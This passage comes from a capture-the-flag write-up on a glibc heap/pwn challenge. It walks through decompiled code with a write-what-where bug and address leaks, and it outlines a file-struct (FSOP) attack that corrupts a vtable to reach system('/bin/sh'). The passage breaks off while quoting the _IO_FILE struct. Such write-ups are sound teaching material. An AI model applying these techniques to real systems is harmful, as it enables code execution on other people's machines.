style="--0:#24292E;--1:#E1E4E8">[</span><span style="--0:#005CC5;--1:#79B8FF">4</span><span style="--0:#24292E;--1:#E1E4E8">] </span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#24292E;--1:#E1E4E8"> local_47;</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">27</div></div><div class="code"><span class="indent">  </span><span style="--0:#AE4B07;--1:#FFAB70">recipient</span><span style="--0:#24292E;--1:#E1E4E8">[</span><span style="--0:#005CC5;--1:#79B8FF">5</span><span style="--0:#24292E;--1:#E1E4E8">] </span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#24292E;--1:#E1E4E8"> uStack_3f;</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">28</div></div><div class="code"><span class="indent">  </span><span style="--0:#AE4B07;--1:#FFAB70">recipient</span><span style="--0:#24292E;--1:#E1E4E8">[</span><span style="--0:#005CC5;--1:#79B8FF">6</span><span style="--0:#24292E;--1:#E1E4E8">] </span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#24292E;--1:#E1E4E8"> local_37;</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">29</div></div><div class="code"><span class="indent">  </span><span style="--0:#AE4B07;--1:#FFAB70">recipient</span><span style="--0:#24292E;--1:#E1E4E8">[</span><span style="--0:#005CC5;--1:#79B8FF">7</span><span style="--0:#24292E;--1:#E1E4E8">] </span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#24292E;--1:#E1E4E8"> uStack_2f;</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">30</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">}</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">31</div></div><div class="code">
</div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">32</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">sent_mails </span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#24292E;--1:#E1E4E8"> sent_mails </span><span style="--0:#BF3441;--1:#F97583">+</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">1</span><span style="--0:#24292E;--1:#E1E4E8">;</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">33</div></div><div class="code"><span style="--0:#6F42C1;--1:#B392F0">puts</span><span style="--0:#24292E;--1:#E1E4E8">(</span><span style="--0:#032F62;--1:#9ECBFF">&quot;</span><span style="--0:#005CC5;--1:#79B8FF">\n</span><span style="--0:#032F62;--1:#9ECBFF">Email has been successfully sent to the recipient!&quot;</span><span style="--0:#24292E;--1:#E1E4E8">);</span></div></div></code></pre><div class="copy"><button title="Copy to clipboard" data-copied="Copied!" data-code="__printf_chk(2,&#34;\nEnter recipient email address as hex (e.g. 0x7774664065786974): 0x&#34;);__isoc23_scanf(&#34;%lx&#34;,&#38;recipient);getc(stdin);__printf_chk(2,&#34;\nEnter Subject (8 chars): &#34;);fgets(&#38;subject,9,stdin);pos = strcspn(&#38;subject,&#34;\n&#34;);(&#38;subject)[pos] = '\0';__printf_chk(2,&#34;\nEnter Body (64 chars): &#34;);fgets(&#38;body,65,stdin);pos = strcspn(&#38;body,&#34;\n&#34;);(&#38;body)[pos] = '\0';/* If subject not empty: write the 8-byte aligned subject into *recipient */if (subject != '\0') {   *recipient = CONCAT71(uStack_6f,subject);}/* If body not empty: write multiple 8-byte words from local stack into recipient[0..7] */if (body != '\0') {  *recipient = CONCAT71(uStack_66,body);  recipient[1] = uStack_5f;  recipient[2] = local_57;  recipient[3] = uStack_4f;  recipient[4] = local_47;  recipient[5] = uStack_3f;  recipient[6] = local_37;  recipient[7] = uStack_2f;}sent_mails = sent_mails + 1;puts(&#34;\nEmail has been successfully sent to the recipient!&#34;);"><div></div></button></div></figure></div>
<p>This is effectively a <strong>write what where primitive</strong> because we control both the destination and the content! Also one more thing to notice here is that in the <code>do-while</code> loop the program checks if the <code>sent_mails</code> is greater than 3 or not and if it is greater than 3 it exits. So, we’ll have to overwrite it after 3 writes if we want to do the write multiple times.</p>
<p><img src="https://github.com/user-attachments/assets/154a737d-4728-4fd6-8f50-a85472b6d518" alt/></p>
<p><code>mail_server_info()</code> prints the address of <code>current_license</code> and <code>exit()</code> effectively giving us a libc and pie leak.</p>
<div class="expressive-code"><figure class="frame"><figcaption class="header"></figcaption><pre data-language="c" class="wrap" style="--ecMaxLine:73ch"><code><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">1</div></div><div class="code"><span style="--0:#BF3441;--1:#F97583">void</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#6F42C1;--1:#B392F0">mail_server_info</span><span style="--0:#24292E;--1:#E1E4E8">(</span><span style="--0:#BF3441;--1:#F97583">void</span><span style="--0:#24292E;--1:#E1E4E8">)</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">2</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">{</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">3</div></div><div class="code"><span class="indent">  </span><span style="--0:#BF3441;--1:#F97583">int</span><span style="--0:#24292E;--1:#E1E4E8"> pos;</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">4</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">  </span></span><span style="--0:#24292E;--1:#E1E4E8">undefined8 libc_release;</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">5</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">  </span></span><span style="--0:#24292E;--1:#E1E4E8">undefined8 libc_version;</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">6</div></div><div class="code">
</div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">7</div></div><div class="code"><span class="indent">  </span><span style="--0:#6F42C1;--1:#B392F0">puts</span><span style="--0:#24292E;--1:#E1E4E8">(</span><span style="--0:#032F62;--1:#9ECBFF">&quot;=== Mail Server Information ===&quot;</span><span style="--0:#24292E;--1:#E1E4E8">);</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">8</div></div><div class="code"><span class="indent">  </span><span style="--0:#6F42C1;--1:#B392F0">__printf_chk</span><span style="--0:#24292E;--1:#E1E4E8">(</span><span style="--0:#005CC5;--1:#79B8FF">2</span><span style="--0:#24292E;--1:#E1E4E8">,</span><span style="--0:#032F62;--1:#9ECBFF">&quot;Name: </span><span style="--0:#005CC5;--1:#79B8FF">%s\n</span><span style="--0:#032F62;--1:#9ECBFF">&quot;</span><span style="--0:#24292E;--1:#E1E4E8">,</span><span style="--0:#032F62;--1:#9ECBFF">&quot;EXITNCTION&quot;</span><span style="--0:#24292E;--1:#E1E4E8">);</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">9</div></div><div class="code"><span class="indent">  </span><span style="--0:#6F42C1;--1:#B392F0">__printf_chk</span><span style="--0:#24292E;--1:#E1E4E8">(</span><span style="--0:#005CC5;--1:#79B8FF">2</span><span style="--0:#24292E;--1:#E1E4E8">,</span><span style="--0:#032F62;--1:#9ECBFF">&quot;Version: </span><span style="--0:#005CC5;--1:#79B8FF">%s\n</span><span style="--0:#032F62;--1:#9ECBFF">&quot;</span><span style="--0:#24292E;--1:#E1E4E8">,</span><span style="--0:#032F62;--1:#9ECBFF">&quot;1.3.3.7&quot;</span><span style="--0:#24292E;--1:#E1E4E8">);</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">10</div></div><div class="code"><span class="indent">  </span><span style="--0:#6F42C1;--1:#B392F0">__printf_chk</span><span style="--0:#24292E;--1:#E1E4E8">(</span><span style="--0:#005CC5;--1:#79B8FF">2</span><span style="--0:#24292E;--1:#E1E4E8">,</span><span style="--0:#032F62;--1:#9ECBFF">&quot;Email sending limit: </span><span style="--0:#005CC5;--1:#79B8FF">%d</span><span style="--0:#032F62;--1:#9ECBFF">/</span><span style="--0:#005CC5;--1:#79B8FF">%d\n</span><span style="--0:#032F62;--1:#9ECBFF">&quot;</span><span style="--0:#24292E;--1:#E1E4E8">,sent_mails,</span><span style="--0:#005CC5;--1:#79B8FF">3</span><span style="--0:#24292E;--1:#E1E4E8">);</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">11</div></div><div class="code"><span class="indent">  </span><span style="--0:#6F42C1;--1:#B392F0">__printf_chk</span><span style="--0:#24292E;--1:#E1E4E8">(</span><span style="--0:#005CC5;--1:#79B8FF">2</span><span style="--0:#24292E;--1:#E1E4E8">,</span><span style="--0:#032F62;--1:#9ECBFF">&quot;License: </span><span style="--0:#005CC5;--1:#79B8FF">%s</span><span style="--0:#032F62;--1:#9ECBFF"> (</span><span style="--0:#005CC5;--1:#79B8FF">%p</span><span style="--0:#032F62;--1:#9ECBFF">)</span><span style="--0:#005CC5;--1:#79B8FF">\n</span><span style="--0:#032F62;--1:#9ECBFF">&quot;</span><span style="--0:#24292E;--1:#E1E4E8">,</span><span style="--0:#032F62;--1:#9ECBFF">&quot;Trial&quot;</span><span style="--0:#24292E;--1:#E1E4E8">,</span><span style="--0:#BF3441;--1:#F97583">&amp;</span><span style="--0:#24292E;--1:#E1E4E8">current_license);</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">12</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">  </span></span><span style="--0:#24292E;--1:#E1E4E8">libc_release </span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#6F42C1;--1:#B392F0">gnu_get_libc_release</span><span style="--0:#24292E;--1:#E1E4E8">();</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">13</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">  </span></span><span style="--0:#24292E;--1:#E1E4E8">libc_version </span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#6F42C1;--1:#B392F0">gnu_get_libc_version</span><span style="--0:#24292E;--1:#E1E4E8">();</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">14</div></div><div class="code"><span class="indent">  </span><span style="--0:#6F42C1;--1:#B392F0">__printf_chk</span><span style="--0:#24292E;--1:#E1E4E8">(</span><span style="--0:#005CC5;--1:#79B8FF">2</span><span style="--0:#24292E;--1:#E1E4E8">,</span><span style="--0:#032F62;--1:#9ECBFF">&quot;Backend: </span><span style="--0:#005CC5;--1:#79B8FF">%s</span><span style="--0:#032F62;--1:#9ECBFF">-</span><span style="--0:#005CC5;--1:#79B8FF">%s</span><span style="--0:#032F62;--1:#9ECBFF"> (</span><span style="--0:#005CC5;--1:#79B8FF">%p</span><span style="--0:#032F62;--1:#9ECBFF">)</span><span style="--0:#005CC5;--1:#79B8FF">\n</span><span style="--0:#032F62;--1:#9ECBFF">&quot;</span><span style="--0:#24292E;--1:#E1E4E8">,libc_version,libc_release,exit);</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">15</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">  </span></span><span style="--0:#24292E;--1:#E1E4E8">pos </span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#6F42C1;--1:#B392F0">strcmp</span><span style="--0:#24292E;--1:#E1E4E8">(current_license,</span><span style="--0:#032F62;--1:#9ECBFF">&quot;DEBUG&quot;</span><span style="--0:#24292E;--1:#E1E4E8">);</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">16</div></div><div class="code"><span class="indent">  </span><span style="--0:#BF3441;--1:#F97583">if</span><span style="--0:#24292E;--1:#E1E4E8"> (pos </span><span style="--0:#BF3441;--1:#F97583">!=</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">0</span><span style="--0:#24292E;--1:#E1E4E8">) {</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">17</div></div><div class="code"><span class="indent">    </span><span style="--0:#BF3441;--1:#F97583">return</span><span style="--0:#24292E;--1:#E1E4E8">;</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">18</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">  </span></span><span style="--0:#24292E;--1:#E1E4E8">}</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">19</div></div><div class="code"><span class="indent">  </span><span style="--0:#6F42C1;--1:#B392F0">__printf_chk</span><span style="--0:#24292E;--1:#E1E4E8">(</span><span style="--0:#005CC5;--1:#79B8FF">2</span><span style="--0:#24292E;--1:#E1E4E8">,</span><span style="--0:#032F62;--1:#9ECBFF">&quot;Internal Debug Info: </span><span style="--0:#005CC5;--1:#79B8FF">%p</span><span style="--0:#032F62;--1:#9ECBFF">&quot;</span><span style="--0:#24292E;--1:#E1E4E8">,_r_debug._8_8_);</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">20</div></div><div class="code"><span class="indent">  </span><span style="--0:#BF3441;--1:#F97583">return</span><span style="--0:#24292E;--1:#E1E4E8">;</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">21</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">}</span></div></div></code></pre><div class="copy"><button title="Copy to clipboard" data-copied="Copied!" data-code="void mail_server_info(void){  int pos;  undefined8 libc_release;  undefined8 libc_version;  puts(&#34;=== Mail Server Information ===&#34;);  __printf_chk(2,&#34;Name: %s\n&#34;,&#34;EXITNCTION&#34;);  __printf_chk(2,&#34;Version: %s\n&#34;,&#34;1.3.3.7&#34;);  __printf_chk(2,&#34;Email sending limit: %d/%d\n&#34;,sent_mails,3);  __printf_chk(2,&#34;License: %s (%p)\n&#34;,&#34;Trial&#34;,&#38;current_license);  libc_release = gnu_get_libc_release();  libc_version = gnu_get_libc_version();  __printf_chk(2,&#34;Backend: %s-%s (%p)\n&#34;,libc_version,libc_release,exit);  pos = strcmp(current_license,&#34;DEBUG&#34;);  if (pos != 0) {    return;  }  __printf_chk(2,&#34;Internal Debug Info: %p&#34;,_r_debug._8_8_);  return;}"><div></div></button></div></figure></div>
<div class="expressive-code"><figure class="frame is-terminal"><figcaption class="header"><span class="title"></span><span class="sr-only">Terminal window</span></figcaption><pre data-language="bash" class="wrap" style="--ecMaxLine:37ch"><code><div class="ec-line"><div class="code"><span style="--0:#BF3441;--1:#F97583">&gt;</span><span style="--0:#24292E;--1:#E1E4E8"> server</span></div></div><div class="ec-line"><div class="code"><span style="--0:#032F62;--1:#9ECBFF">===</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">Mail</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">Server</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">Information</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">===</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">Name:</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">EXITNCTION</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">Version:</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">1.3.3.7</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">Email</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">sending</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">limit:</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">0/3</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">License:</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">Trial</span><span style="--0:#24292E;--1:#E1E4E8"> (0x55a143c070b0)</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">Backend:</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">2.39-stable</span><span style="--0:#24292E;--1:#E1E4E8"> (0x7fb435847ba0)</span></div></div><div class="ec-line"><div class="code">
</div></div><div class="ec-line"><div class="code"><span style="--0:#BF3441;--1:#F97583">&gt;</span><span style="--0:#24292E;--1:#E1E4E8"> ^C</span></div></div></code></pre><div class="copy"><button title="Copy to clipboard" data-copied="Copied!" data-code="> server=== Mail Server Information ===Name: EXITNCTIONVersion: 1.3.3.7Email sending limit: 0/3License: Trial (0x55a143c070b0)Backend: 2.39-stable (0x7fb435847ba0)> ^C"><div></div></button></div></figure></div>
<h2 id="exploitation">Exploitation</h2>
<p>Now what? We have a write what where … but, no idea what to do with it. :’(</p>
<p>What we could do is take a look at the limitations we have thus, helping us eliminate techinques that are not do-able and then see what we are left with.</p>
<p>Let’s see! <code>Full RELRO</code> is enabled so, we can’t perform <code>got overwrite</code>. There is a call to <code>free()</code> when the program exits! But, in <code>&gt;= glibc-2.34</code> the <code>__malloc_hook</code> and <code>__free_hook</code> are not used so, can’t overwrite the hooks to get shell either. There are only two options we are left with that are <code>ret2system</code> by leaking stack address through <code>environ</code> variable and then overwriting the saved address. Or, we could perform file struct exploitation by writing a fake file struct to writeable memory and then overwriting <code>_IO_list_all</code> to that fake file struct so, when <code>_IO_flush_all</code> is called it calls the vtable which we have corrupted so, it does <code>_IO_wfile_seekoff-&gt;_IO_switch_to_wget_mode-&gt;__OVERFLOW</code> chain to do <code>system(&#39;/bin/sh\x00&#39;)</code>.</p>
<blockquote>
<p>Update:
I was talking to someone from pwn.college discord server and he told me that the intended path was to corrupt the exit handlers and thus the name <code>exit-nction</code>. And, here I was thinking that it was extinction.
<a href="https://m101.github.io/binholic/2017/05/20/notes-on-abusing-exit-handlers.html" rel="nofollow noreferrer noopener" target="_blank">https://m101.github.io/binholic/2017/05/20/notes-on-abusing-exit-handlers.html</a></p>
</blockquote>
<p>Now, I chose to do file struct exploitation because i’m the follower of the mantra “reject rop and embrace fsop!”.</p>
<hr/>
<h3 id="what-are-file-structs-_io_file--_io_file_plus">What are file structs? <code>_IO_FILE</code> &amp; <code>_IO_FILE_plus</code></h3>
<p>In order to understand how we can do file structure exploitation works let’s deep dive! Now, what is a file struct? <code>_IO_FILE</code> is a structure that is usually returned by functions like <code>fopen</code> and used by functions like <code>fwrite</code>, <code>fread</code> etc. Now, why do we need these file structs? We were doing just fine with <code>write</code> and <code>read</code> syscall? The purpose of file structs is to the read and write operation faster by using a buffer reduce the number of read and write syscalls.</p>
<div class="expressive-code"><figure class="frame"><figcaption class="header"></figcaption><pre data-language="c" class="wrap" style="--ecMaxLine:79ch"><code><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">1</div></div><div class="code"><span style="--0:#616972;--1:#99A0A6">/* The tag name of this struct is _IO_FILE to preserve historic</span></div></div><div class="ec-line" style="--ecIndent:3ch"><div class="gutter"><div class="ln" aria-hidden="true">2</div></div><div class="code"><span class="indent"><span style="--0:#616972;--1:#99A0A6">   </span></span><span style="--0:#616972;--1:#99A0A6">C++ mangled names for functions taking FILE* arguments.</span></div></div><div class="ec-line" style="--ecIndent:3ch"><div class="gutter"><div class="ln" aria-hidden="true">3</div></div><div class="code"><span class="indent"><span style="--0:#616972;--1:#99A0A6">   </span></span><span style="--0:#616972;--1:#99A0A6">That name should not be used in new code.  */</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">4</div></div><div class="code"><span style="--0:#BF3441;--1:#F97583">struct</span><span style="--0:#24292E;--1:#E1E4E8"> _IO_FILE</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">5</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">{</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">6</div></div><div class="code"><span class="indent">  </span><span style="--0:#BF3441;--1:#F97583">int</span><span style="--0:#24292E;--1:#E1E4E8"> _flags;</span><span style="--0:#616972;--1:#99A0A6">    /* High-order word is _IO_MAGIC; rest is flags. */</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">7</div></div><div class="code">
</div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">8</div></div><div class="code"><span class="indent"><span style="--0:#616972;--1:#99A0A6">  </span></span><span style="--0:#616972;--1:#99A0A6">/* The following pointers correspond to the C++ streambuf protocol. */</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">9</div></div><div class="code"><span class="indent">  </span><span style="--0:#BF3441;--1:#F97583">char</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">*</span><span style="--0:#24292E;--1:#E1E4E8">_IO_read_ptr;</span><span style="--0:#616972;--1:#99A0A6">  /* Current read pointer */</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">10</div></div><div class="code"><span class="indent">  </span><span style="--0:#BF3441;--1:#F97583">char</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">*</span><span style="--0:#24292E;--1:#E1E4E8">_IO_read_end;</span><span style="--0:#616972;--1:#99A0A6">  /* End of get area. */</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">11</div></div><div class="code"><span class="indent">  </span><span style="--0:#BF3441;--1:#F97583">char</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">*</span><span style="--0:#24292E;--1:#E1E4E8">_IO_read_base;</span><span style="--0:#616972;--1:#99A0A6">  /* Start of putback+get area. */</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">12</div></div><div class="code"><span class="indent">  </span><span style="--0:#BF3441;--1:#F97583">char</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">*</span><span style="--0:#24292E;--1:#E1E4E8">_IO_write_base;</span><span style="--0:#616972;--1:#99A0A6">  /* Start of put area. */</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">13</div></div><div class="code"><span class="indent">  </span><span style="--0:#BF3441;--1:#F97583">char</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">*</span><span style="--0:#24292E;--1:#E1E4E8">_IO_write_ptr;</span><span style="--0:#616972;--1:#99A0A6">  /* Current put pointer. */</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">14</div></div><div class="code"><span class="indent">  </span><span style="--0:#BF3441;--1:#F97583">char</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">*</span><span style="--0:#24292E;--1:#E1E4E8">_IO_write_end;</span><span style="--0:#616972;--1:#99A0A6">  /* End of put area. */</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">15</div></div><div class="code"><span class="indent">  </span><span style="--0:#BF3441;--1:#F97583">char</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">*</span><span style="--0:#24292E;--1:#E1E4E8">_IO_buf_base;</span><span style="--0:#616972;--1:#99A0A6">  /* Start of reserve area. */</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">16</div></div><div class="code"><span class="indent">  </span><span style="--0:#BF3441;--1:#F97583">char</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">*</span><span style="--0:#24292E;--1:#E1E4E8">_IO_buf_end;</span><span style="--0:#616972;--1:#99A0A6">  /* End of reserve area. */</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">17</div></div><div class="code">
</div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">18</div></div><div class="code"><span class="indent"><span style="--0:#616972;--1:#99A0A6">  </span></span><span style="--0:#616972;--1:#99A0A6">/* The following fields are used to support backing up and undo. */</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">19</div></div><div class="code"><span class="indent">  </span><span style="--0:#BF3441;--1:#F97583">char</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">*</span><span style="--0:#24292E;--1:#E1E4E8">_IO_save_base;</span><span style="--0:#616972;--1:#99A0A6"> /* Pointer to start of non-current get area. */</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">20</div></div><div class="code"><span class="indent">  </span><span style="--0:#BF3441;--1:#F97583">char</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">*</span><span style="--0:#24292E;--1:#E1E4E8">_IO_backup_base;</span><span style="--0:#616972;--1:#99A0A6">  /* Pointer to first valid character of backup area */</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">21</div></div><div class="code"><span class="indent">  </span><span style="--0:#BF3441;--1:#F97583">char</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">*</span><span style="--0:#24292E;--1:#E1E4E8">_IO_save_end;</span><span style="--0:#616972;--1:#99A0A6"> /* Pointer to end of non-current get area. */</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">22</div></div><div class="code">
</div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">23</div></div><div class="code"><span class="indent">  </span><span style="--0:#BF3441;--1:#F97583">struct</span><span style="--0:#24292E;--1:#E1E4E8"> _IO_marker </span><span style="--0:#BF3441;--1:#F97583">*</span><span style="--0:#24292E;--1:#E1E4E8">_markers;</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">24</div></div><div class="code">
</div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">25</div></div><div class="code"><span class="indent">  </span><span style="--0:#BF3441;--1:#F97583">struct</span><span style="--0:#24292E;--1:#E1E4E8"> _IO_FILE </span><span style="--0:#BF3441;--1:#F97583">*</span><span style="--0:#24292E;--1:#E1E4E8">_chain;</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">26</div></div><div class="code">
</div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">27</div></div><div class="code"><span class="indent">  </span><span style="--0:#BF3441;--1:#F97583">int</span><span style="--0:#24292E;--1:#E1E4E8"> _fileno;</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">28</div></div><div class="code"><span class="indent">  </span><span style="--0:#BF3441;--1:#F97583">int</span><span style="--0:#24292E;--1:#E1E4E8"> _flags2;</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">29</div></div><div class="code"><span class="indent">  </span><span style="--0:#005CC5;--1:#79B8FF">__off_t</span><span style="--0:#24292E;--1:#E1E4E8"> _old_offset;</span><span style="--0:#616972;--1:#99A0A6"> /* This used to be _offset but it&#39;s too small.  */</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">30</div></div><div class="code">
</div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">31</div></div><div class="code"><span class="indent"><span style="--0:#616972;--1:#99A0A6">  </span></span><span style="--0:#616972;--1:#99A0A6">/* 1+column number of pbase(); 0 is unknown. */</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">32</div></div><div class="code"><span class="indent">  </span><span style="--0:#BF3441;--1:#F97583">unsigned</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">short</span><span style="--0:#24292E;--1:#E1E4E8"> _cur_column;</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">33</div></div><div class="code"><span class="indent">  </span><span style="--0:#BF3441;--1:#F97583">signed</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">char</span><span style="--0:#24292E;--1:#E1E4E8"> _vtable_offset;</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">34</div></div><div class="code"><span class="indent">  </span><span style="--0:#BF3441;--1:#F97583">char</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span 